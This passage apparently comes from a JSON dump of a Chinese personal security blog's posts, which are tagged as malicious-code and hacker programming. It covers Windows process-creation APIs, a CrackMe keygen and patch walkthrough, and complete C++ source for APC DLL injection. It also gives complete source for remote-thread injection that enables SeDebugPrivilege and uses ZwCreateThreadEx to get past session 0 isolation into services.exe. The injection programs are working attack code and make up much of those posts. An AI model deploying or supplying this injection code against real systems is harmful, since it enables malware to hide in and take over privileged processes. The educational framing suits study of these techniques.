","excerpt":"","text":"创建进程API在一个进程中创建并启动一个新的进程，对于病毒木马程序和普通的程序来说，都是常见的技术。在用户层上微软提供WinExec，ShellExecute和CreateProcess等函数来实现进程创建。 具体实现及函数介绍WinExec运行指定的应用程序 1234UINT WinExec( LPCSTR lpCmdLine, UINT uCmdShow); lpCmdLine：要执行的应用程序的命令行。如果参数中的可执行文件名称不包含文件路径，则系统按以下顺序搜索可执行文件： 应用程序加载的目录 当前目录 Windows系统目录。GetSystemDirectory函数检索此目录的路径。 Windows目录。GetWindowsDirectory函数检索此目录的路径。 PATH环节变量中列出的目录 uCmdShow：显示选项，具体内容如下表： 值 含义 SW_HIDE0 隐藏窗口并激活另一个窗口 SW_SHOWNORMALSW_NORMAL1 激活并显示一个窗口 SW_SHOWMINIMIZED2 激活窗口并将其显示为最小化的窗口 SW_SHOWMAXIMIZEDSW_MAXIMIZE3 激活窗口并将其显示为最大化窗口 SW_SHOWNOACTIVATE4 以最近的大小和位置显示窗口 SW_SHOW5 激活窗口并以其当前大小和位置显示它 SW_MINIMIZE6 最小化指定的窗口并激活Z顺序中的下一个顶级窗口 SW_SHOWMINNOACTIVE7 将窗口显示为最小化窗口 SW_SHOWNA8 以当前大小和位置显示窗口 SW_RESTORE9 激活并显示窗口 SW_SHOWDEFAULT10 根据启动应用程序的程序传递给CreateProcess函数的STARTUPINFO结构中指定的SW_值设置显示状态。 SW_FORCEMINIMIZE11 最小化一个窗口，即使拥有该窗口的线程没有响应。仅在最小化来自不同线程的窗口时才应使用此标志。 返回值：如果函数成功，则返回值大于31；如果函数失败，则返回值是以下错误值之一。 值 含义 0 系统内存或资源不足 ERROR_BAD_FORMAT exe文件无效 ERROR_FILE_NOT_FOUND 找不到指定文件 ERROR_PATH_NOT_FOUND 找不到指定的路径 具体代码如下： 123456HINSTANCE hInstance = ShellExecute(NULL, NULL, &quot;C:\\\\Users\\\\Tophanter\\\\Desktop\\\\TestApc.exe&quot;, NULL, NULL, SW_NORMAL);if ((int)hInstance &lt;= 32) &#123; printf(&quot;ShellExecute创建失败\\n&quot;);&#125;else printf(&quot;ShellExecute创建成功\\n&quot;); 创建的进程为之前编写过得MFC程序，运行此程序即可提示创建成功，同时TestAPC也被成功创建。 ShellExecute函数对指定文件执行操作 12345678HINSTANCE ShellExecuteA( HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd); hwnd：用于显示UI或者错误信息的父窗口的句柄。如果操作与窗口无关，则此值可以为NULL。 lpOperation：指向以空字符结尾的字符串的指针，它在本例中成为动词，用于指定要执行的操作。常使用的动词有： edit：启动编辑器并打开文档进行编辑。如果lpFile不是文档文件，则该函数将失败。 explore：探索由lpFile指定的文件夹。 find：在由lpDirectory指定的目录中启动搜索。 open：打开由lpFile指定的项目。该项目可以是文件也可以是文件夹。 print：打印由lpFile指定的文件。如果lpFile不是文档文件，则该函数失败。 NULL：如果可用，则使用默认动词。如果不可用，则使用“打开”动词。如果两个动词都不可用，则系统使用注册表中列出的第一个动词。 lpFile：指向以空字符结尾的字符串的指针，该字符串要在其上指向指定谓词的文件或对象。如果lpDirectory参数使用相对路径，则lpFile不要使用相对路径。 lpParameters：如果lpFile指定一个可执行文件，则此参数是一个指向空字符结尾的字符串的指针，该字符串指定要传递给应用程序的参数。如果lpFile指定一个文档文件，则lpParameters应该为NULL。 lpDirectory：指向以空终止的字符串的指针，该字符串指定操作的默认目录。如果此值为NULL，则使用当前的工作目录。如果在lpFile提供了相对路径，请不要对lpDirectory使用相对路径。 nShowCmd：指定应用程序在打开时如何显示标志，具体值在上文。 返回值：如果函数成功，则返回大于32的值。如果函数失败，则它返回一个错误值，指示失败的原因。 具体代码如下： 123456HINSTANCE hInstance = ShellExecute(NULL, NULL, &quot;C:\\\\Users\\\\Tophanter\\\\Desktop\\\\TestApc.exe&quot;, NULL, NULL, SW_NORMAL);if ((int)hInstance &lt;= 32) &#123; printf(&quot;ShellExecute创建失败\\n&quot;);&#125;else printf(&quot;ShellExecute创建成功\\n&quot;); 运行程序提示创建成功，同时TestAPC被成功创建。 CreateProcess创建一个新进程及主线程。新进程在调用进程的安全的上下文中运行。 123456789101112BOOL CreateProcess( LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation); lpApplicationName：要执行的模块的名称。可以设置为NULL。要运行批处理文件，必须启动命令解释程序，并将其设置为cmd.exe。 lpCommandLine：要执行的命令行。 lpProcessAttributes：指向SECURITY_ATTRIBUTES结构的指针，该 结构确定返回的新进程对象的句柄是否可以被子进程继承。如果lpProcessAttributes为NULL，则不能继承句柄。 lpThreadAttributes：指向SECURITY_ATTRIBUTES结构的指针，该 结构确定返回的新线程对象句柄是否可由子进程继承。如果lpThreadAttributes为 NULL，则不能继承句柄。 bInheritHandles：如果此参数为 TRUE，则调用进程中的每个可继承句柄都由新进程继承。如果参数为 FALSE，则不继承句柄。 dwCreationFlags：控制优先级类和进程创建的标志。 lpEnvironment：指向新进程的环境块的指针。如果此参数为NULL，则新进程使用调用进程的环境。 lpCurrentDirectory：进程当前目录的完整路径。该字符串还可以指定 UNC 路径。如果此参数为NULL，则新进程将与调用进程具有相同的当前驱动器和目录。 lpStartupInfo：指向STARTUPINFO或STARTUPINFOEX结构的指针 。STARTUPINFO或STARTUPINFOEX中的句柄在不需要时必须由CloseHandle关闭。 lpProcessInformation：指向PROCESS_INFORMATION结构的指针，该结构接收有关新进程的标识信息。PROCESS_INFORMATION中的句柄必须在不需要时由CloseHandle关闭。 返回值：如果函数成功，则返回值非0；若失败，则返回值为0。 具体代码如下： 12345678910111213STARTUPINFO si = &#123; 0 &#125;;PROCESS_INFORMATION pi;si.cb = sizeof(si);si.dwFlags = STARTF_USESHOWWINDOW;si.wShowWindow = SW_NORMAL;BOOL flag = CreateProcess(NULL, &quot;C:\\\\Users\\\\Tophanter\\\\Desktop\\\\TestApc.exe&quot;, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi);if (flag) &#123; CloseHandle(pi.hThread); CloseHandle(pi.hProcess); printf(&quot;CreateProcess创建成功\\n&quot;);&#125;else printf(&quot;CreateProcess创建失败\\n&quot;); 运行之后，即可成功创建TestAPC进程。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"启动技术","slug":"启动技术","permalink":"https://b1ack1e.github.io/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"}]},{"title":"160CrackMe--001","slug":"160CrackMe-001","date":"2021-07-14T02:23:13.000Z","updated":"2021-07-14T06:50:17.951Z","comments":true,"path":"2021/07/14/160CrackMe-001/","link":"","permalink":"https://b1ack1e.github.io/2021/07/14/160CrackMe-001/","excerpt":"","text":"初探打开程序会弹出如下的窗口，根据标题可以看出，我们需要“杀死”这个弹窗。 程序主题界面有两部分，第一部分是序列号加名字。 第二部分是单纯的序列号，应该是比较简单。 看完大体流程，开始分析。 分析查询程序的基本信息，可以看到未加壳，是用Delphi语言编写的。 先分析单纯的序列号。用OD打开程序，搜索字符串，搜索错误的提示，可以看到成功与错误的提示，还有一个JNZ，这里应该是关键的判断跳转。 在函数头部下断点，开始分析。可以看到它把Hello和Dude！压入栈之后，再将其拼接起来组成新的字符串，然后再与我们输入的序列号进行比较。 那么这里的序列号就是Hello Dude!。输入正确的序列号之后，弹出正确的窗口。 再来分析序列号加用户名还是通过搜索错误提示的字符串，即可找到关键的跳转，在最后的跳转前查看一下，可以看到栈存放着两个值进行比较，一个是我们输入的123456，另一个是CW-80360-CRACKED，那么这个应该是要输入的serial。往上开始寻找这段序列号是如何生成的。在函数头部下断开始分析。 首先是检测了输入的用户名长度，不可以小于4位。 继续往下看，可以看到CW，-，CRACKED和数字这几段，然后通过一个函数将它们拼接起来，字母都是本身有的，那么就需要寻找数字的生成。 数字是通过sub_406718生成的，而其中的参数是通过0x431750处传入的，那么这个值是从哪来的，从上分析。可以看到这里的计算过程。它是获取输入用户名第一位然后乘以0x29再乘以2。而之后的sub_406718作用是将十六进制转为十进制字符串。 到这里整个过程就分析了，开始尝试编写注册机 注册机编写12345678910111213141516171819#include &quot;pch.h&quot;#include &lt; stdio.h &gt;#include &lt;string.h&gt;#include &lt;corecrt_malloc.h&gt;int main()&#123; char Name[20]; printf(&quot;请输入大于四位的用户名\\n&quot;); gets_s(Name, 20); int Num; Num = (Name[0] * 0x29) * 2; char* s1=&quot;CW&quot;; char* s2 = &quot;CRACKED&quot;; char* s3= &quot;-&quot;; char* serial = (char*)malloc(100); sprintf(serial, &quot;%s%s%d%s%s&quot;, s1, s3, Num, s3, s2); printf(&quot;用户名是：%s\\nserial是：%s&quot;, Name, serial); return 0;&#125; 输入用户名b1ackie，就可以计算出正确的serial。 输入正确的值查看 弹窗的消除先根据弹窗的提示信息，搜索字符串，可以定位到此处。 执行出来，可以看到在外部有一个JZ跳转可以跳过这个弹窗函数，我们只需要将其修改为JMP就可以无条件跳走了。 小结第一个crackme，还是比较简单的，没有什么难度，做起来比较轻松。 还记得上次做这个还是大一的时候，那个时候也刚接触这块没多久，当时还是看着帖子一步一步学着来。学习记录还是要坚持做下去，这些crackme也要坚持争取全部都做一遍。","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/tags/CrackMe/"}]},{"title":"注入技术-APC注入","slug":"注入技术-APC注入","date":"2021-07-13T07:25:36.000Z","updated":"2021-07-27T08:46:34.144Z","comments":true,"path":"2021/07/13/注入技术-APC注入/","link":"","permalink":"https://b1ack1e.github.io/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/","excerpt":"","text":"APC注入APC为异步过程调用，是指函数在特定线程中被异步执行。每一个线程都有自己的APC队列，使用QueueUserAPC函数可以把一个APC函数压入APC队列中，插入LoadLibrary就可以执行DLL。该线程并不会直接调用APC函数，除非该线程处于一个可通知的状态。 函数介绍QueueUserAPC将用户模式中的异步过程调用（APC）对象添加到指定线程的APC队列中。 12345DWORD QueueUserAPC( PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData); pfnAPC：当指定线程执行可警告的等待操作时，指向应用程序提供的APC函数的指针。 hThread：线程的句柄。该句柄必须具有THREAD_SET_CONTEXT访问权限。 dwData：传递由pfnAPC参数指向的APC函数的单个值。 返回值：如果函数成功，则返回值为非0；如果失败，则返回值为0。 具体实现在Windows系统中，每个线程都会维护一个线程APC队列，通过QueueUserAPC把一个APC函数添加到指定线程的APC队列中。每个线程都有自己的APC队列，这个APC队列记录了要求线程执行的一些APC函数。Windows系统会发出一个软中断去执行这些APC函数，对于用户模式下的APC队列，当线程处在可警告状态时才会执行这些APC函数。一个线程在内部使用SingalObjectAndWait、SleepEx、WaitForSingleObjectEx等函数把自己挂起时就是进入警告状态，此时便会执行APC队列函数。 具体代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167// APCInject.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;atlconv.h&gt;#include &lt;atlstr.h&gt;DWORD GetPidByName(char* pszProcessName) &#123; HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 PE32 = &#123; sizeof(PE32) &#125;; USES_CONVERSION; CString ProcessName = A2T(pszProcessName); BOOL flag = Process32First(hSnap, &amp;PE32); while (flag) &#123; if (lstrcmp(PE32.szExeFile, ProcessName) == 0) &#123; return PE32.th32ProcessID; &#125; flag = Process32Next(hSnap, &amp;PE32); &#125; return 0;&#125;BOOL GetAllThreadIdByProcessId(DWORD dwProcessId, DWORD** ppThreadId, DWORD* pdwThreadIdLength)&#123; DWORD* pThreadId = NULL; DWORD dwThreadIdLength = 0; DWORD dwBufferLength = 1000; THREADENTRY32 te32 = &#123; 0 &#125;; HANDLE hSnapshot = NULL; BOOL bRet = TRUE; do &#123; // 申请内存 pThreadId = new DWORD[dwBufferLength]; if (NULL == pThreadId) &#123; printf(&quot;申请内存失败\\n&quot;); bRet = FALSE; break; &#125; RtlZeroMemory(pThreadId, (dwBufferLength * sizeof(DWORD))); // 获取线程快照 RtlZeroMemory(&amp;te32, sizeof(te32)); te32.dwSize = sizeof(te32); hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); if (NULL == hSnapshot) &#123; bRet = FALSE; break; &#125; // 获取第一条线程快照信息 bRet = Thread32First(hSnapshot, &amp;te32); while (bRet) &#123; // 获取进程对应的线程ID if (te32.th32OwnerProcessID == dwProcessId) &#123; pThreadId[dwThreadIdLength] = te32.th32ThreadID; dwThreadIdLength++; &#125; // 遍历下一个线程快照信息 bRet = Thread32Next(hSnapshot, &amp;te32); &#125; // 返回 *ppThreadId = pThreadId; *pdwThreadIdLength = dwThreadIdLength; bRet = TRUE; &#125; while (FALSE); if (FALSE == bRet) &#123; if (pThreadId) &#123; delete[]pThreadId; pThreadId = NULL; &#125; &#125; return bRet;&#125;BOOL Inject(char* pszProcessName, char* pszDllname) &#123; BOOL flag = FALSE; DWORD dwPID = 0; DWORD* pThreadId = NULL; DWORD dwThreadLength = 0; HANDLE hProcess = NULL; HANDLE hThread = NULL; PVOID pBaseAddress = NULL; PVOID pLoadLibraryFunc = NULL; SIZE_T dwRet = 0, dwDllPathLen = strlen(pszDllname) + 1; DWORD i = 0; do &#123; //获取进程的PID dwPID = GetPidByName(pszProcessName); if (dwPID == 0) &#123; printf(&quot;获取PID失败\\n&quot;); flag = FALSE; break; &#125; //获取所有线程ID flag = GetAllThreadIdByProcessId(dwPID, &amp;pThreadId, &amp;dwThreadLength); if (flag == FALSE) &#123; flag = FALSE; break; &#125; //打开进程 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); if (hProcess == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); flag = FALSE; break; &#125; //申请内存空间 pBaseAddress = VirtualAllocEx(hProcess, NULL, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (pBaseAddress == NULL) &#123; printf(&quot;申请空间失败\\n&quot;); flag = FALSE; break; &#125; //向申请的空间写入内存 WriteProcessMemory(hProcess, pBaseAddress, pszDllname, dwDllPathLen, &amp;dwRet); if (dwRet != dwDllPathLen) &#123; printf(&quot;写入内存失败\\n&quot;); flag = FALSE; break; &#125; pLoadLibraryFunc = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); if (pLoadLibraryFunc == NULL) &#123; printf(&quot;获取loadlibrary地址失败\\n&quot;); flag = FALSE; break; &#125; //向所有的线程插入APC函数 for (i = 0; i &lt; dwThreadLength; i++) &#123; hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadId[i]); if (hThread) &#123; QueueUserAPC((PAPCFUNC)pLoadLibraryFunc, hThread, (ULONG_PTR)pBaseAddress); CloseHandle(hThread); hThread = NULL; &#125; &#125; flag = TRUE; &#125; while (FALSE); if (hProcess) &#123; CloseHandle(hProcess); hProcess = NULL; &#125; if (pThreadId) &#123; delete[]pThreadId; pThreadId = NULL; &#125; return flag;&#125;int main()&#123; BOOL flag=Inject(&quot;TestApc.exe&quot;, &quot;C:\\\\Users\\\\Tophanter\\\\Desktop\\\\RemoteTest.dll&quot;); if (flag == TRUE) &#123; printf(&quot;注入成功\\n&quot;); &#125; else printf(&quot;失败\\n&quot;); getchar(); return 0;&#125; 效果查看写一个MFC的小程序，点击确定按钮之后就会调用SleepEx函数。 123456void CTestApcDlg::OnBnClickedOk()&#123; // TODO: 在此添加控件通知处理程序代码 SleepEx(10000, true); //CDialogEx::OnOK();&#125; 然后打开我们的注入程序，看到提示已经注入成功。 点击确定按钮，就会弹出我们在DLL里写好的弹窗。 使用process explore工具查看可以看到我们的DLL已经注入到TestApc.exe中了。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"注入","slug":"注入","permalink":"https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"注入技术-突破session 0隔离的远线程注入","slug":"注入技术-突破session 0隔离的远线程注入","date":"2021-07-13T02:02:17.000Z","updated":"2021-07-27T08:46:23.887Z","comments":true,"path":"2021/07/13/注入技术-突破session 0隔离的远线程注入/","link":"","permalink":"https://b1ack1e.github.io/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/","excerpt":"","text":"SESSION 0隔离在早期操作系统中，所有的服务和应用程序都是运行在同一个session中，session 0。这些一起运行的服务与应用程序，由于服务是以最高权限进行运行的，所以造成一些安全风险，恶意代码可以利用这点来提升自己的权限。 在Visita中，服务在一个叫做session0的特殊session中承载。应用程序在其他session中，这样服务与应用程序就隔离开来。这样的话，恶意代码要向注入到关键的系统服务进程中，就会因为session 0的隔离而失败。 但是直接调用zwCreateThreadEx函数可以进行远线程注入，还可以突破隔离。 实现原理实现突破SESSION 0隔离的注入技术是使用比CreateRemoteThread函数更为底层的ZwCreateThreadEx函数来创建的远线程的。因为此函数在ntdll.dll中没有声明，所以需要使用GetProcAddress从ntdll.dll中获取该函数的导出地址。 ZwCreateThreadEx函数比CreateRemoteThread函数更为底层，那么CreateRemoteThread函数最终还是通过调用ZwCreateThreadEx函数来实现远线程创建的。为什么使用CreateRemoteThread函数没有用。经过前人的跟踪与分析，发现调用ZwCreateThreadEx函数创建远线程的时候，第七个参数的值为1，这会导致创建的线程完成后一直挂起无法恢复运行，这就是为什么DLL注入失败的原因。要想成功的话，就要直接调用ZwCreateThreadEx函数，将第七个参数设置为0，这样线程创建完成之后就会恢复运行，成功注入。 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133#include &quot;pch.h&quot;#include &lt;Windows.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;atlconv.h&gt;#include &lt;atlstr.h&gt;BOOL CreateRemoteThreadInject(DWORD dwProcessId, WCHAR* pszDllFileName) &#123; //提升权限 HANDLE hToken; if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &amp;hToken) == false) &#123; printf(&quot;打开近访问令牌失败\\n&quot;); return FALSE; &#125; LUID luid; if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid) == false) &#123; printf(&quot;查看特权信息失败\\n&quot;); return FALSE; &#125; TOKEN_PRIVILEGES tkp; tkp.PrivilegeCount = 1; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; tkp.Privileges[0].Luid = luid; if (false == AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) &#123; printf(&quot;调节权限失败\\n&quot;); return FALSE; &#125; HANDLE hProcess = NULL; DWORD dwSize = 0; LPVOID pDllAddr = NULL; FARPROC pFuncProcAddr = NULL; //获取注入进程句柄 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); return FALSE; &#125; dwSize = lstrlen(pszDllFileName) + 1; //printf(&quot;dwSize:%d\\n&quot;, dwSize); //申请内存 pDllAddr = VirtualAllocEx(hProcess, NULL, 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); if (pDllAddr == NULL) &#123; printf(&quot;申请内存失败\\n&quot;); return FALSE; &#125; //向申请的内存写入数据 BOOL WriteFlag = WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize * 2, NULL); if (WriteFlag == NULL) &#123; printf(&quot;写入内存失败\\n&quot;); return FALSE; &#125; HMODULE hNtdll = LoadLibrary(L&quot;ntdll.dll&quot;); if (hNtdll == NULL) &#123; printf(&quot;获取NTDLL地址失败\\n&quot;); return FALSE; &#125; //获取loadlibrary pFuncProcAddr = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;); if (pFuncProcAddr == NULL) &#123; printf(&quot;获取loadlibrary地址失败\\n&quot;); return FALSE; &#125;#ifdef _WIN64 typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown);#else typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown);#endif typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdll, &quot;ZwCreateThreadEx&quot;); if (ZwCreateThreadEx == NULL) &#123; printf(&quot;获取ZW地址失败\\n&quot;); return FALSE; &#125; HANDLE hRemoteThread = NULL; ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, 0, 0, 0, NULL); if (hRemoteThread == NULL) &#123; printf(&quot;创建失败\\n&quot;); return FALSE; &#125; CloseHandle(hProcess); FreeLibrary(hNtdll); return TRUE;&#125;DWORD GetPID(char* pszProcessName) &#123; HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe = &#123; sizeof(pe) &#125;;//初始化 USES_CONVERSION; CString ProcessName = A2T(pszProcessName); BOOL flag = Process32First(hSnap, &amp;pe); while (flag) &#123; if (lstrcmp(pe.szExeFile, ProcessName) == 0) &#123; return pe.th32ProcessID; &#125; flag = Process32Next(hSnap, &amp;pe); &#125; CloseHandle(hSnap); return 0;&#125;int main() &#123; printf(&quot;按下回车开始注入\\n&quot;); getchar(); DWORD dwPID = GetPID(&quot;services.exe&quot;); bool flag = CreateRemoteThreadInject(dwPID, L&quot;C:\\\\Users\\\\b1ackie\\\\Desktop\\\\RemoteTest.dll&quot;); if (flag == FALSE) &#123; printf(&quot;注入失败\\n&quot;); &#125; else printf(&quot;注入成功\\n&quot;); getchar(); return 0;&#125; 效果查看尝试注入SESSION 0的service.exe，使用Process Explorer可以看到services.exe的相关信息 打开程序，按下回车开始注入，显示注入成功 使用Process Explorer查看services.exe的导入模块 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"注入","slug":"注入","permalink":"https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"注入技术-远程线程注入","slug":"注入技术-远程线程注入","date":"2021-07-12T03:56:15.000Z","updated":"2021-07-27T08:46:29.318Z","comments":true,"path":"2021/07/12/注入技术-远程线程注入/","link":"","permalink":"https://b1ack1e.github.io/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/","excerpt":"","text":"远程线程注入远程线程注入是指一个进程在另一个进程中创建线程的技术。 函数介绍OpenProcess打开现有的本地进程对象 12345HANDLE OpenProcess( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId); dwDesiredAccess：访问进程对象。此访问权限为针对进程的安全描述符进行检查，此参数可以是一个或者多个进程访问权限。如果调用了该函数的进程启用了SeDebugPrivilege权限，则无论安全描述符的内容是什么，它都会授予所请求的访问权限。 bInheritHandle：若此值为TRUE，则此进程创建的进程将继承该句柄。否则，进程不会进程此句柄。 dwProcessId：要打开的本地进程PID。 返回值：如果函数成功，则返回值是指定进程的打开句柄；如果失败，则返回值为NULL。 VirtualAllocEx在指定进程的虚拟地址空间内保留、提交或更改内存的状态。 1234567LPVOID VirtualAllocEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect); hProcess：进程的句柄。此函数在该进程的虚拟地址空间内分配内存，句柄必须具有PROCESS_VM_OPERATION访问权限。 lpAddress：指定要分配页面所需起始地址的指针。如果为NULL，则该函数自动分配内存。 dwSize：要分配的内存大小，以字节为单位。 flAllocationType：内存分配类型。此参数必须为以下值之一。 值 含义 MEM_COMMIT0x00001000 在磁盘的分页文件和整体内存中，为指定的预留内存页分配内存 MEM_RESERVE0x00002000 保留进程中虚拟地址空间的范围，但不会在内存或磁盘上的分页文件中分配任何实际物理存储位置 MEM_RESET0x00080000 表示不再关注由lpAddress和dwSize指定的内存范围内的数据，页面不应从页面文件中读取或写入。 MEM_RESET_UNDO0x1000000 只能在早期成功应用了MEM_RESET的地址范围内调用MEM_RESET_UNDO flProtect：要分配的页面区域的内存保护。如果页面已提交，则可以指定任何一个内存保护常量。如果lpAddress指定了一个地址，则flProtect不能是以下任何值： PAGE_NOACCESS PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE 返回值：如果函数成功，则返回值是分配页面的基址；如果失败，则返回为NULL。 WriteProcessMemory在指定的进程中将数据写入内存区域，要写入的整个区域必须可访问，否则操作失败。 1234567BOOL WriteProcessMemory( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten); hProcess：要修改的进程内存的句柄。句柄必须具有PROCESS_VM_WRITE和PROCESS_VM_OPERATION访问权限。 lpBaseAddress：指向指定进程中写入数据的基地址指针。在数据传输发生之前，系统会验证指定大小的基地址和内存中的所有数据是否可以进行写入访问，如果不可以访问，则该函数将失败。 lpBuffer：指向缓冲区的指针，其中包含要写入指定进程的地址空间中的数据。 nSize：要写入指定进程的字节数。 lpNumberOfBytesWritten：指向变量的指针，该变量接受传输到指定进程的字节数。如果为NULL，则忽略该参数。 返回值：如果函数成功，则返回值不为0；如果失败，则为0； CreateRemoteThread创建一个在另一个进程的虚拟地址空间中运行的线程。 123456789HANDLE CreateRemoteThread( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); hProcess：要创建线程的进程的句柄。句柄必须具有PROCESS_CREATE_THREAD、PROCESS_QUERY_INFORMATION、PROCESS_VM_OPERATION、PROCESS_VM_WRITE和PROCESS_VM_READ访问权限。 lpThreadAttributes：指向SECURITY_ATTRIBUTES结构的指针，该结构指定新线程的安全描述符，并确定子进程是否可以继承返回的句柄。如果为NULL，则线程将会获得默认的安全描述符，并且不能继承该句柄。 dwStackSize：堆栈的初始大小，以字节为单位。如果参数为0，则新线程使用可执行文件的默认大小。 lpStartAddress：指向由线程执行类型为LPTHREAD_START_ROUTINE的应用程序定义的函数指针，并表示远程进程中线程的起始地址，该函数必须存在于远程进程中。 lpParameter：指向要传递给线程函数的变量的指针。 dwCreationFlags：控制线程创建的标志。 值 含义 0 线程在创建后立即运行 CREATE_SUSPENDED 该线程在挂起状态下创建，并且在调用ResumeThread函数之前不会运行 STACK_SIZE_PARAM_IS_A_RESERVATION 